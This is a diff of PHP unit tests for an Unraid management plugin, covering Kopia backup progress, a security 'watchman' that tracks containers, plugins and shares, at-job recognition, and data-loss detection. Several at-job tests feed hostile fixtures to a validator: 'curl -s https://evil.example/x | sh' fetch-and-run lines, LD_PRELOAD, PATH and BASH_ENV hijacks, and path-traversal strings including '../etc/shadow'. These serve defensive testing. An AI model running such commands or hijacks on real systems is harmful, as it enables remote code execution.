@@ -410,6 +410,78 @@ function testEstimates(): void
 }
 
 /**
+ * Mr. Backupsy and a first upload to Kopia: which source has no snapshot in the repository yet (a new
+ * repository starts every source anew), the Kopia process found in /proc (a copy), what it read, the
+ * snapshot's size, and the rate between looks — replayed with what nostromo's upload showed on 2026-10-06
+ */
+function testBackupFirstUpload(): void
+{
+    $run = fn (string $id, int $started, array $kopia) => ['run' => $id, 'started' => $started,
+        'kopia' => array_map(fn ($n, $ok) => ['name' => $n, 'ok' => $ok, 'seconds' => 3, 'finished' => $started + 60], array_keys($kopia), $kopia)];
+    $history = [$run('c', 3000, ['appdata' => true, 'app:immich' => false]), $run('b', 2000, ['Backups_statisch' => true]), $run('a', 1000, ['appdata' => true])];
+    same('first upload: copied before, the repository unknown — not the first time', false, backupFirstUpload('Backups_statisch', $history, null));
+    same('first upload: copied only into an earlier repository — the first time', true, backupFirstUpload('Backups_statisch', $history, 2500));
+    same('first upload: copied since the repository came', false, backupFirstUpload('appdata', $history, 2500));
+    same('first upload: failed so far, or never there', [true, true], [backupFirstUpload('app:immich', $history, null), backupFirstUpload('isos', $history, null)]);
+
+    same('first upload: a container path on the host (the longest mapping)', '/mnt/user/appdata/kopia/repository.config',
+        backupContainerHostPath([['Source' => '/mnt/user/appdata/kopia', 'Destination' => '/config'], ['Source' => '/mnt/user', 'Destination' => '/']],
+            '/config/repository.config'));
+    same('first upload: not mapped, or with ..', [null, null], [backupContainerHostPath([['Source' => '/mnt/x', 'Destination' => '/data']], '/config/repository.config'),
+        backupContainerHostPath([['Source' => '/mnt/user/appdata/kopia', 'Destination' => '/config']], '/config/../etc/shadow')]);
+    $policies = [['kind' => 'share', 'name' => 'Backups_statisch', 'path' => '/backup-snapshots/Backups_statisch'],
+                 ['kind' => 'app', 'name' => 'immich', 'path' => '/backup-snapshots/.apps/immich']];
+    same('first upload: where Kopia reads a source', [['/backup-snapshots/Backups_statisch', '/Backups_statisch'], ['/backup-snapshots/.apps/immich', '/.apps/immich'],
+        [null, '/.vms/Debian'], [null, '/_flash']],
+        [backupKopiaSourcePath('Backups_statisch', $policies), backupKopiaSourcePath('app:immich', $policies), backupKopiaSourcePath('vm:Debian', $policies),
+         backupKopiaSourcePath('flash', $policies)]);
+
+    // /proc as the host sees the engine's docker exec: the client, Kopia in the container, another source
+    $proc = sys_get_temp_dir() . '/office-tests-upload-' . getmypid();
+    $ps = ['3123' => ['docker', 'exec', '-u', '0', 'kopia', 'kopia', '--no-progress', 'snapshot', 'create', '/backup-snapshots/Backups_statisch', '--description', 'uso-backup 20261006-0100'],
+           '4456' => ['kopia', '--no-progress', 'snapshot', 'create', '/backup-snapshots/Backups_statisch', '--description', 'uso-backup 20261006-0100'],
+           '5789' => ['kopia', '--no-progress', 'snapshot', 'create', '/backup-snapshots/Backups_statisch_alt'],
+           '6000' => ['kopia', 'server', 'start', '--address=0.0.0.0:51515']];
+    foreach ($ps as $pid => $argv) {
+        @mkdir("$proc/$pid", 0700, true);
+        file_put_contents("$proc/$pid/cmdline", implode("\0", $argv) . "\0");
+    }
+    file_put_contents("$proc/4456/io", "rchar: 2390370860668\nwchar: 1180491244705\nsyscr: 36974388\nsyscw: 73561450\nread_bytes: 3466402299392\n");
+    same('first upload: the Kopia process of the source (not the docker client, not another source)', [4456, 4456, null],
+        [backupKopiaPid('/backup-snapshots/Backups_statisch', '/Backups_statisch', $proc), backupKopiaPid(null, '/Backups_statisch', $proc),
+         backupKopiaPid('/backup-snapshots/isos', '/isos', $proc)]);
+    same('first upload: what it has read (rchar, not what it sent)', [2390370860668, null], [backupProcRead(4456, $proc), backupProcRead(3123, $proc)]);
+    exec('rm -rf ' . escapeshellarg($proc));
+
+    $zfs = "ripley/Backups_statisch@uso-backup-20261005-0100\t2355000000000\nripley/Backups_statisch@uso-backup-20261006-0100\t2355490998272\n"
+         . "ripley/Backups_statisch/child@uso-backup-20261006-0100\t1000\nripley/Backups_statisch/child@other\t5\n";
+    same('first upload: the size of this run\'s snapshot, child datasets too', [2355490999272, null],
+        [backupZfsSnapSum($zfs, 'uso-backup-20261006-0100'), backupZfsSnapSum($zfs, 'uso-backup-20261007-0100')]);
+
+    // nostromo, 2026-10-06: Backups_statisch from 04:18:47; at 13:20 the snapshot (2.36 TB) was read past its size — done 13:27:58
+    $c = ['source' => 'Backups_statisch', 'size' => 2355490998272, 'looks' => []];
+    [$c, $o] = backupUploadStep($c, 1791253127, 2390370860668, 1791285605);
+    same('first upload: the first look — the average since it started, any moment now', ['Backups_statisch', true, 73599694, 0, 1],
+        [$o['source'], $o['first'], $o['rate'], $o['left'], count($c['looks'])]);
+    // a made-up one: 1 TB, 100 MB/s on average, 50 MB/s for the last minutes
+    $t0 = 1000000;
+    $c = ['source' => 'x', 'size' => 10 ** 12, 'looks' => []];
+    [$c, $o] = backupUploadStep($c, $t0, 0, $t0 + 30);
+    same('first upload: too early for a rate', [null, null, 0], [$o['rate'], $o['left'], $o['read']]);
+    [$c, $o] = backupUploadStep($c, $t0, 360 * 10 ** 9, $t0 + 3600);
+    same('first upload: from the newest look before the last 15 minutes', [100840336, 6347], [$o['rate'], $o['left']]);
+    [$c, $o] = backupUploadStep($c, $t0, 360 * 10 ** 9 + 300 * 50 * 10 ** 6, $t0 + 3900);
+    same('first upload: the rate between looks minutes apart', [50000000, 12500], [$o['rate'], $o['left']]);
+    for ($t = $t0 + 3920; $t <= $t0 + 6000; $t += 5) {
+        [$c] = backupUploadStep($c, $t0, 375 * 10 ** 9 + ($t - $t0 - 3900) * 50 * 10 ** 6, $t);
+    }
+    check('first upload: a look every 20 seconds, the last 15 minutes and one before', count($c['looks']) <= BACKUP_UPLOAD_KEEP / 20 + 2
+        && $t0 + 6000 - $c['looks'][0][0] > BACKUP_UPLOAD_KEEP && $t0 + 6000 - $c['looks'][1][0] <= BACKUP_UPLOAD_KEEP, json_encode([count($c['looks']), $c['looks'][0] ?? null]));
+    [, $o] = backupUploadStep(['source' => 'x', 'size' => null, 'looks' => []], $t0, 10 ** 9, $t0 + 600);
+    same('first upload: no size, no estimate (but a rate)', [null, 1666667], [$o['left'], $o['rate']]);
+}
+
+/**
  * Mr. Backupsy's packages (engine 2.18): the office's reader on a made-up backup place, and the
  * engine's own helpers (lib/common.sh section 8: folder names, old run folders, an interrupted swap)
  */
@@ -1376,6 +1448,126 @@ function testWatchman(): void
 }
 
 /**
+ * What is gone (a container removed, a plugin uninstalled, a share deleted) leaves "What I keep an eye
+ * on" at once — counted is what is there — but he still remembers it: one that comes back the same is quiet
+ */
+function testWatchmanGone(): void
+{
+    $now = 1791280000;
+    $known = ['app' => ['tokens' => ['--privileged'], 'seen' => $now - 600], 'db' => ['tokens' => [], 'seen' => $now - 600]];
+    $book = [];
+    $added = watchmanContainersCompare($known, ['db' => ['image' => 'postgres', 'tokens' => []]], $book, $now);
+    same('watch gone: a container removed — nothing to tell, still remembered', [[], true], [$added, isset($known['app'])]);
+    $added = watchmanContainersCompare($known, ['db' => ['image' => 'postgres', 'tokens' => []], 'app' => ['image' => 'x', 'tokens' => ['--privileged']]], $book, $now + 600);
+    same('watch gone: back with the same rights — quiet', [[], []], [$added, $book]);
+    $added = watchmanContainersCompare($known, ['db' => ['image' => 'postgres', 'tokens' => []], 'app' => ['image' => 'x', 'tokens' => ['--privileged', '--network=host']]], $book, $now + 900);
+    same('watch gone: back with more — told', ['container_host'], $added);
+
+    $tmp = sys_get_temp_dir() . '/office-tests-gone-' . getmypid();
+    @mkdir($tmp, 0700, true);
+    $b = ['hired' => 1000, 'time' => 1000, 'ips' => [], 'fail_ips' => [], 'flash' => ['go' => null, 'extra' => [], 'users' => ['root'], 'pw' => [], 'keys' => []],
+          'containers' => ['app' => ['tokens' => ['--privileged'], 'seen' => $now], 'db' => ['tokens' => ['-p 5432:5432/tcp'], 'seen' => $now], 'web' => ['tokens' => [], 'seen' => $now],
+                           'Grafana' => ['tokens' => ['-p 3000:3000/tcp'], 'seen' => $now - 900], 'zz-test' => ['tokens' => ['--privileged'], 'seen' => $now - 900]],
+          'plugins' => ['user.scripts' => ['source' => 'raw.githubusercontent.com/x', 'version' => '1', 'seen' => $now],
+                        'vmbackup' => ['source' => 'raw.githubusercontent.com/y', 'version' => '2', 'seen' => $now - 900]],
+          'shares' => ['Filme' => ['smb' => 2, 'nfs' => 0, 'seen' => $now], 'appdata' => ['smb' => 0, 'nfs' => 0, 'seen' => $now],
+                       'zz-test' => ['smb' => 2, 'nfs' => 0, 'seen' => $now - 900]],
+          'sched' => null];
+    file_put_contents("$tmp/baseline.json", json_encode($b));
+    file_put_contents("$tmp/seen.json", json_encode(['containers' => ['app' => [], 'db' => [], 'web' => []], 'plugins' => ['user.scripts' => []],
+                                                     'shares' => ['Filme' => [], 'appdata' => []]]));
+    $w = watchmanPageState($tmp, $now, false)['watch'];
+    same('watch gone: counted and listed is what is there now', [3, ['app', 'db'], ['user.scripts'], 2, ['Filme']],
+        [$w['containers']['count'], array_column($w['containers']['special'], 'name'), array_column($w['plugins'], 'name'), $w['shares']['count'],
+         array_column($w['shares']['open'], 'share')]);
+    @unlink("$tmp/seen.json");
+    $w = watchmanPageState($tmp, $now, false)['watch'];
+    same('watch gone: without the last round\'s look — his memory as it is', [5, 2, 3], [$w['containers']['count'], count($w['plugins']), $w['shares']['count']]);
+    exec('rm -rf ' . escapeshellarg($tmp));
+}
+
+/**
+ * A User Script started «in the background» goes through atd (User Scripts' backgroundScript.sh:
+ * echo startBackground.php "/tmp/user.scripts/tmpScripts/<name>/script" | at NOW -M): a plain line in
+ * the book, noted by itself — only when the job is exactly that, for a script that exists, with an
+ * environment that can't run something else. Anything else in the queue stays an at_job.
+ */
+function testWatchmanAtUserScript(): void
+{
+    $tmp = sys_get_temp_dir() . '/office-tests-atus-' . getmypid();
+    $us = "$tmp/src/flash/user.scripts";
+    foreach (['temporäre_rsyncs_4', 'CKW Batch 2026'] as $n) {
+        @mkdir("$us/scripts/$n", 0700, true);
+        file_put_contents("$us/scripts/$n/script", "#!/bin/bash\necho $n\n");
+    }
+    $head = fn (string $env = '') => "#!/bin/sh\n# atrun uid=0 gid=0\n# mail root 0\numask 22\nSHELL=/bin/bash; export SHELL\nPWD=/; export PWD\nHOME=/; export HOME\n"
+        . "PATH=/bin:/sbin:/usr/bin:/usr/sbin; export PATH\nunraiduuid=0123\\-abcd; export unraiduuid\n$env"
+        . "cd /usr/local/emhttp/plugins/user\\.scripts || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n";
+    $wrap = fn (string $cmds) => "\${SHELL:-/bin/sh} << 'marcinDELIMITER5c3e1b2a'\n$cmds\nmarcinDELIMITER5c3e1b2a\n";
+    $launch = fn (string $name) => "/usr/local/emhttp/plugins/user.scripts/startBackground.php /tmp/user.scripts/tmpScripts/$name/script";
+    $is = fn (string $job) => watchmanAtUserScript($job, $us);
+    same('at user script: the launcher of an existing script (a name with ä, one with spaces; at with and without its SHELL wrapper)',
+        ['temporäre_rsyncs_4', 'CKW Batch 2026', 'temporäre_rsyncs_4'],
+        [$is($head() . $wrap($launch('temporäre_rsyncs_4'))), $is($head() . $wrap($launch('CKW Batch 2026'))), $is($head() . $launch('temporäre_rsyncs_4') . "\n")]);
+    same('at user script: anything else is not', array_fill(0, 11, null), [
+        $is($head() . $wrap($launch('temporäre_rsyncs_5'))),                                                         // no such script
+        $is($head() . $wrap('/usr/local/emhttp/plugins/user.scripts/startBackground.php /tmp/evil/script')),        // not User Scripts' copy
+        $is($head() . $wrap($launch('../../../boot/config/plugins/user.scripts/scripts/CKW Batch 2026'))),         // out of tmpScripts
+        $is($head() . $wrap($launch('temporäre_rsyncs_4') . "\ncurl -s https://evil.example/x | sh")),              // and more
+        $is($head() . $wrap($launch('temporäre_rsyncs_4') . '; curl -s https://evil.example/x | sh')),
+        $is($head() . $wrap($launch('temporäre_rsyncs_4')) . "curl -s https://evil.example/x | sh\n"),              // after the wrapper
+        $is($head("LD_PRELOAD=/tmp/x\\.so; export LD_PRELOAD\n") . $wrap($launch('temporäre_rsyncs_4'))),         // an environment that runs something else
+        $is($head("PATH=/tmp/\\.x:/bin; export PATH\n") . $wrap($launch('temporäre_rsyncs_4'))),
+        $is($head("SHELL=/tmp/\\.x/sh; export SHELL\n") . $wrap($launch('temporäre_rsyncs_4'))),
+        $is($head("BASH_ENV=/tmp/x; export BASH_ENV\n") . $wrap($launch('temporäre_rsyncs_4'))),
+        $is("#!/bin/sh\n" . $launch('temporäre_rsyncs_4') . "\n"),                                                   // not as at writes it
+    ]);
+
+    // rounds: the job waiting, then running (=), then gone — one plain line; a foreign job next to it is told
+    $src = "$tmp/src";
+    $data = "$tmp/data";
+    foreach (['crontabs', 'cron.d', 'logplugins', 'atjobs', 'agents', 'extra', 'ssh'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/logplugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
+              'etc_passwd' => "$src/passwd", 'crontabs' => "$src/crontabs", 'cron_d' => "$src/cron.d", 'cron_files' => "$src/flash",
+              'userscripts' => $us, 'atjobs' => "$src/atjobs", 'agents' => "$src/agents"];
+    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
+    file_put_contents($paths['go'], "#!/bin/bash\n");
+    file_put_contents($paths['syslog'], '');
+    file_put_contents("$src/logplugins/user.scripts.plg", "<PLUGIN name=\"user.scripts\" version=\"1\">\n");
+    $envBefore = getenv('OFFICE_NOTIFY_BIN');
+    putenv("OFFICE_NOTIFY_BIN=$tmp/no-notify");                 // never Unraid's own
+    $now = 1791285000;
+    $docker = fn () => [];
+    $acks = "$tmp/acks.json";
+    watchmanRound($paths, $data, 1000, $now, $docker, false, $acks);
+    $job = $head() . $wrap($launch('temporäre_rsyncs_4'));
+    file_put_contents("$src/atjobs/a000dd01c78c21", $job);
+    touch("$src/atjobs", $now + 10);
+    $r1 = watchmanRound($paths, $data, 1000, $now + 300, $docker, false, $acks);
+    rename("$src/atjobs/a000dd01c78c21", "$src/atjobs/=000dd01c78c21");
+    file_put_contents("$src/atjobs/a000de01c78c40", $head() . $wrap('curl -s https://evil.example/x | sh'));
+    touch("$src/atjobs", $now + 400);
+    $r2 = watchmanRound($paths, $data, 1000, $now + 600, $docker, false, $acks);
+    $book = watchmanLoad($data)['book'];
+    $us1 = array_values(array_filter($book, fn ($e) => $e['kind'] === 'at_userscript'));
+    same('at user script: one line, noted by itself, nothing to tell; the foreign job next to it is', [[], ['at_job'], 1, 'temporäre_rsyncs_4', 'auto', false,
+        ['at_job' => 1], ['at_job']],
+        [$r1['added'], $r2['added'], count($us1), $us1[0]['p']['name'] ?? null, $us1[0]['by'] ?? null, watchmanOpen($us1[0] ?? []),
+         watchmanOpenCounts($book), array_column($r2['told'], 'kind')]);
+    same('at user script: nothing for the team lead', ['at_job'], array_column(watchmanFindings($book), 'id'));
+    $page = watchmanPageState($data, $now + 700, false);
+    $row = array_values(array_filter($page['book'], fn ($e) => $e['kind'] === 'at_userscript'))[0] ?? [];
+    same('at user script: on the page — the script, noted by itself', ['temporäre_rsyncs_4', false, 'auto', 'sched'],
+        [$row['t']['name'] ?? null, $row['open'] ?? null, $row['by'] ?? null, $row['group'] ?? null]);
+    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
+    @unlink(watchmanLockFile($data, 'book'));
+    exec('rm -rf ' . escapeshellarg($tmp));
+}
+
+/**
  * The night watchman's watch over what starts on its own: root's own crontab next to Unraid's (new
  * lines, lines in both, the office's own lines, programs gone, the syslog as evidence), the plugins'
  * .cron files, User Scripts, atd's queue, the notification agents — all on copies in a temporary folder.
@@ -1565,6 +1757,125 @@ function testWatchmanSched(): void
     putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
     @unlink(watchmanLockFile($data, 'book'));
     exec('rm -rf ' . escapeshellarg($tmp));
+}
+
+/**
+ * The night watchman and data that vanishes: per ZFS share from `referenced` (its snapshots keeping
+ * some, a pool asleep named), per XFS/btrfs disk from its used space (not while its snapshots changed),
+ * who moved data then — and what is no loss: what moves data (the mover …), the office at work, a
+ * dataset put into Ms. Dustdevil's storeroom or the storeroom emptied
+ */
+function testWatchmanFlowGone(): void
+{
+    $gb = 1024 ** 3;
+    $tmp = sys_get_temp_dir() . '/office-tests-gone-flow-' . getmypid();
+    same('gone movers: who moves data (not unbalanced\'s web page, always running)', ['mover', 'mover', 'embycache', 'gather', 'rsync', null, 'storeroom', null, null], array_map('watchmanFlowMover', [
+        ['/bin/bash', '/usr/local/sbin/mover', 'start'], ['/bin/bash', '/usr/local/emhttp/plugins/ca.mover.tuning/age_mover', 'start'],
+        ['python3', '/usr/local/emhttp/plugins/unraid-secretary-office/embycache/embycache_run.py', '--run'],
+        ['bash', '/usr/local/emhttp/plugins/unraid-secretary-office/gather/consolidate_master.sh', 'run'],
+        ['rsync', '-a', '--remove-source-files', '/mnt/user/a/', '/mnt/user/b/'], ['rsync', '-a', '/mnt/user/a/', '/mnt/user/b/'],
+        ['rm', '-rf', '--', '/mnt/hive/Serien/_UnraidSecretaryOffice-trash/20261006-1010.purging'], ['rm', '-rf', '/mnt/hive/Serien/Staffel 1'],
+        ['/usr/local/emhttp/plugins/unbalanced/unbalanced', '--port', '7090']]));
+    foreach (['100' => ['/bin/bash', '/usr/local/sbin/mover', 'start'], '200' => ['sleep', '60'], 'self' => ['x']] as $pid => $argv) {
+        @mkdir("$tmp/proc/$pid", 0700, true);
+        file_put_contents("$tmp/proc/$pid/cmdline", implode("\0", $argv) . "\0");
+    }
+    same('gone movers: from /proc', [['mover'], null], [watchmanFlowMovers("$tmp/proc"), watchmanFlowMovers("$tmp/none")]);
+
+    // the disks: an awake btrfs disk with snapshots and shares, an XFS one asleep, ZFS left to the datasets
+    foreach (['disk1/.btrfs-snap/20261006-0100', 'disk1/Serien', 'disk1/Filme', 'disk1/_UnraidSecretaryOffice-trash', 'disk1/.Recycle.Bin', 'disk2/Filme'] as $d) {
+        @mkdir("$tmp/mnt/$d", 0700, true);
+    }
+    touch("$tmp/mnt/disk1/.btrfs-snap", 1791200000);
+    file_put_contents("$tmp/disks.ini", "[parity]\nname=\"parity\"\ntype=\"Parity\"\nfsType=\"\"\n[disk1]\nname=\"disk1\"\ntype=\"Data\"\nfsType=\"luks:btrfs\"\nfsStatus=\"Mounted\"\nspundown=\"0\"\n"
+        . "[disk2]\nname=\"disk2\"\ntype=\"Data\"\nfsType=\"xfs\"\nfsStatus=\"Mounted\"\nspundown=\"1\"\n[hive]\nname=\"hive\"\ntype=\"Cache\"\nfsType=\"zfs\"\nfsStatus=\"Mounted\"\nspundown=\"0\"\n");
+    $d = watchmanFlowDisks(['disks_ini' => "$tmp/disks.ini", 'mnt' => "$tmp/mnt"]);
+    same('gone disks: the awake XFS/btrfs ones with their shares and snapshot time, the sleeping one not asked', [['disk1'], 'btrfs', 1791200000, ['Filme', 'Serien'], true, ['disk2']],
+        [array_keys($d['disks'] ?? []), $d['disks']['disk1']['fs'] ?? null, $d['disks']['disk1']['snap'] ?? null,
+         (function (array $a) { sort($a); return $a; })($d['disks']['disk1']['shares'] ?? []), ($d['disks']['disk1']['used'] ?? 0) > 0, $d['asleep'] ?? null]);
+    exec('rm -rf ' . escapeshellarg($tmp));
+
+    same('gone: the share of a dataset — also a share put whole into the storeroom (a second run in that second: -2)', ['Serien', 'Serien', 'Serien', null, 'Serien', 'old'],
+        [watchmanGoneShare('tank/Serien'), watchmanGoneShare('tank/Serien/Staffel 1'), watchmanGoneShare('tank/Serien/_UnraidSecretaryOffice-trash-20261006-140500-x'),
+         watchmanGoneShare('tank'), watchmanGoneShare('tank/_UnraidSecretaryOffice-trash-20261006-140500-Serien/sub'),
+         watchmanGoneShare('tank/_UnraidSecretaryOffice-trash-20261006-140500-2-old')]);
+
+    // rounds on made-up looks
+    $t0 = strtotime('2026-10-06 14:02:00');
+    $ds = fn (int $r, int $b = 0) => ['w' => 0, 'u' => $r + $b, 's' => 1000, 'r' => $r, 'b' => $b];
+    $look = fn (array $o) => $o + ['conns' => [], 'smb' => ['on' => true, 'sessions' => []], 'containers' => null, 'nfs' => false, 'holder' => null, 'kopia' => 'kopia',
+                                   'zfs' => null, 'office_shares' => ['UnraidSecretaryOffice'], 'disks' => null, 'moving' => []];
+    $conn = fn (string $peer, int $sent, string $svc = 'ssh', int $lport = 22) => ['local' => '192.0.2.20', 'lport' => $lport, 'peer' => $peer, 'pport' => 50000,
+        'service' => $svc, 'sent' => $sent, 'rcvd' => 0];
+    $zfs = fn (array $sets, array $asleep = []) => ['datasets' => ['tank' => $ds(1)] + $sets, 'pools' => ['tank'], 'asleep' => $asleep];
+    $disks = fn (int $used1, int $used3, int $snap3) => ['disks' => ['disk1' => ['fs' => 'btrfs', 'used' => $used1, 'snap' => 1791200000, 'shares' => ['Filme', 'Serien']],
+        'disk3' => ['fs' => 'btrfs', 'used' => $used3, 'snap' => $snap3, 'shares' => ['Musik']]], 'asleep' => []];
+    $bf = null;
+    $book = [];
+    $all = ['tank/Serien' => $ds(1000 * $gb), 'tank/Serien/sub' => $ds(100 * $gb), 'cold/Serien' => $ds(50 * $gb), 'tank/Filme' => $ds(440 * $gb),
+            'tank/Filme/old' => $ds(20 * $gb), 'tank/Filme/tmp' => $ds(60 * $gb), 'tank/_UnraidSecretaryOffice-trash-20261005-090000-junk' => $ds(30 * $gb)];
+    [, $flow, $cnt] = watchmanFlowCompare($bf, [], null, $look(['conns' => [$conn('192.0.2.7', 1000)], 'zfs' => $zfs($all) + ['pools' => ['tank', 'cold']],
+        'disks' => $disks(10000 * $gb, 5000 * $gb, 1791200000)]), $book, $t0);
+    same('gone: the first look — counters only', [[], []], [$flow['gone'], $book]);
+
+    // five minutes later: 300 GB gone from Serien (200 GB kept by its snapshots, cold asleep), Filme: one dataset into the storeroom,
+    // one destroyed (60 GB of ~520), the storeroom emptied; disk1 200 GB less, disk3's snapshots changed
+    $now = $all;
+    $now['tank/Serien'] = $ds(700 * $gb, 200 * $gb);
+    unset($now['cold/Serien'], $now['tank/Filme/old'], $now['tank/Filme/tmp'], $now['tank/_UnraidSecretaryOffice-trash-20261005-090000-junk']);
+    $now['tank/Filme/_UnraidSecretaryOffice-trash-20261006-140500-old'] = $ds(20 * $gb);
+    [$added, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn('192.0.2.7', 2000)], 'zfs' => $zfs($now, ['cold']),
+        'disks' => $disks(9800 * $gb, 4000 * $gb, $t0 + 200)]), $book, $t0 + 300);
+    $by = array_column(array_filter($book, 'watchmanOpen'), null, 'key');
+    $se = $by['flow_gone:share:Serien']['p'] ?? [];
+    same('gone: Serien (300 GB, 27 %, 200 GB still in snapshots, cold asleep, an SSH client then), Filme (the destroyed one only), disk1 — disk3 left out',
+        [['flow_gone', 'flow_gone', 'flow_gone'], ['flow_gone:disk:disk1', 'flow_gone:share:Filme', 'flow_gone:share:Serien'], [300 * $gb, 27, 200 * $gb, ['cold'], 'clients', ['192.0.2.7 (SSH)']],
+         60 * $gb, 200 * $gb, [0, 0]],
+        [$added, (function (array $a) { sort($a); return $a; })(array_keys($by)), [$se['bytes'] ?? null, $se['pct'] ?? null, $se['kept'] ?? null, $se['asleep'] ?? null, $se['from'] ?? null, $se['clients'] ?? null],
+         $by['flow_gone:share:Filme']['p']['bytes'] ?? null, $by['flow_gone:disk:disk1']['p']['bytes'] ?? null,
+         [array_sum($flow['gone']['disk:disk3']['h'] ?? []), array_sum($flow['gone']['disk:disk3']['o'] ?? [])]]);
+    same('gone in words', "300 GB gone from Serien in 5 min — 27 % of the share while I'm still learning what is normal. 200 GB of it still in its snapshots. "
+        . "Moving data over SMB, NFS or SSH then: 192.0.2.7 (SSH). Not looked at (asleep): cold.",
+        officeNotifyText('watchman', 'entry.flow_gone', watchmanText($by['flow_gone:share:Serien'], 'en'), 'en'));
+    same('gone in words: a disk', "200 GB gone from disk1 (Filme, Serien) in 5 min — more than 100 GB in one round while I'm still learning what is normal. "
+        . "Moving data over SMB, NFS or SSH then: 192.0.2.7 (SSH). Measured for the whole disk (btrfs), not per share.",
+        officeNotifyText('watchman', 'entry.flow_gone', watchmanText($by['flow_gone:disk:disk1'], 'en'), 'en'));
+
+    // the mover runs: what vanishes meanwhile (and the round after) went elsewhere; then nobody connected: from the server itself
+    $now['tank/Musik'] = $ds(800 * $gb);
+    [$added, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn('192.0.2.7', 2000)], 'zfs' => $zfs($now), 'moving' => ['mover']]), $book, $t0 + 600);
+    $now['tank/Musik'] = $ds(600 * $gb);
+    [$added2, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn('192.0.2.7', 2000)], 'zfs' => $zfs($now)]), $book, $t0 + 900);
+    $now['tank/Musik'] = $ds(400 * $gb);
+    [$added3, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn('192.0.2.7', 2000)], 'zfs' => $zfs($now), 'holder' => 'backup']), $book, $t0 + 1200);
+    $now['tank/Musik'] = $ds(200 * $gb);
+    [$added4, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn('192.0.2.7', 2000)], 'zfs' => $zfs($now)]), $book, $t0 + 1500);
+    $mu = array_column(array_filter($book, 'watchmanOpen'), null, 'key')['flow_gone:share:Musik']['p'] ?? [];
+    same('gone: the mover moving (and the round after), the office at work — expected; then 200 GB with nobody connected: the server itself',
+        [[], [], [], ['flow_gone'], 400 * $gb, 'server', []],
+        [$added, $added2, $added3, $added4, array_sum($flow['gone']['share:Musik']['o'] ?? []), $mu['from'] ?? null, $flow['can']['moving'] ?? null]);
+
+    // a whole share (with a child dataset) put into the storeroom, later the storeroom emptied: never a loss
+    $now['tank/Alt'] = $ds(90 * $gb);
+    $now['tank/Alt/kind'] = $ds(10 * $gb);
+    [, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $zfs($now)]), $book, $t0 + 1510);
+    unset($now['tank/Alt'], $now['tank/Alt/kind']);
+    $now['tank/_UnraidSecretaryOffice-trash-20261006-143000-Alt'] = $ds(90 * $gb);
+    $now['tank/_UnraidSecretaryOffice-trash-20261006-143000-Alt/kind'] = $ds(10 * $gb);
+    [$a1, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $zfs($now)]), $book, $t0 + 1520);
+    unset($now['tank/_UnraidSecretaryOffice-trash-20261006-143000-Alt'], $now['tank/_UnraidSecretaryOffice-trash-20261006-143000-Alt/kind']);
+    [$a2, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $zfs($now)]), $book, $t0 + 1530);
+    same('gone: a share put whole into the storeroom, the storeroom emptied — no loss', [[], [], 0],
+        [$a1, $a2, array_sum($flow['gone']['share:Alt']['h'] ?? []) + array_sum($flow['gone']['share:Alt']['o'] ?? [])]);
+
+    $f = watchmanFlowSummary($bf, $flow, $t0 + 1600);
+    $rows = array_column($f['gone'], null, 'key');
+    same('gone on the page: per share and disk, the last 24 h, what was expected, no counters', [300 * $gb, 400 * $gb, 200 * $gb, 'disk1', 100, 10],
+        [$rows['share:Serien']['day'] ?? null, $rows['share:Musik']['expected'] ?? null, $rows['share:Musik']['day'] ?? null, $rows['disk:disk1']['disk'] ?? null,
+         (int) round($f['limits']['gone_new'] / $gb), $f['limits']['gone_part']]);
+    $b2 = ['flow' => $bf];
+    watchmanFlowAdopt($b2, array_column($book, null, 'key')['flow_gone:share:Serien'], $t0 + 1700);
+    same('gone ack: that much is normal for the share now', 300 * $gb, $b2['flow']['ack']['flow_gone:share:Serien']['bytes'] ?? null);
 }
 
 /**
@@ -2347,6 +2658,52 @@ function testAdvisorInstall(): void
     };
     same('advisor dashboard: mappings stay objects, data source filled in', [$objects((string) file_get_contents($src)), false],
         [$objects((string) $out), str_contains((string) $out, '${DS_PROMETHEUS}')]);
+
+    // the provisioned dashboard kept current: only the office's own file (its uid), plain, never created; owner and mode kept
+    $keep = hardeningTmp('advisor-dashboard');
+    $dir = "$keep/provisioning/dashboards/uso";
+    mkdir($dir, 0755, true);
+    $file = "$dir/unraid-secretary-office.json";
+    $old = str_replace('"title": "Unraid Secretary Office (USO)"', '"title": "The office"', (string) $out);
+    check('advisor dashboard keep: the test\'s old version differs', $old !== $out);
+    same('advisor dashboard keep: none there — none made', ['absent', false], [advisorDashboardKeep($file, $out), file_exists($file)]);
+    file_put_contents($file, $old);
+    chmod($file, 0640);
+    $owner = posix_getuid() === 0 ? [472, 100] : [posix_getuid(), posix_getgid()];       // as root: Grafana's user, like a real one
+    chown($file, $owner[0]);
+    chgrp($file, $owner[1]);
+    $ino = fileinode($file);
+    same('advisor dashboard keep: an older version of the office\'s — replaced, owner and mode kept, a new file', ['updated', $out, 0640, $owner, true],
+        [advisorDashboardKeep($file, $out), file_get_contents($file), fileperms($file) & 0777, [fileowner($file), filegroup($file)],
+         (clearstatcache() ?? true) && fileinode($file) !== $ino]);
+    same('advisor dashboard keep: the same — left alone', 'same', advisorDashboardKeep($file, $out));
+    same('advisor dashboard keep: nothing to give', 'none', advisorDashboardKeep($file, null));
+    $theirs = (string) json_encode(['uid' => 'my-own-copy', 'title' => 'Mine', 'panels' => []]);
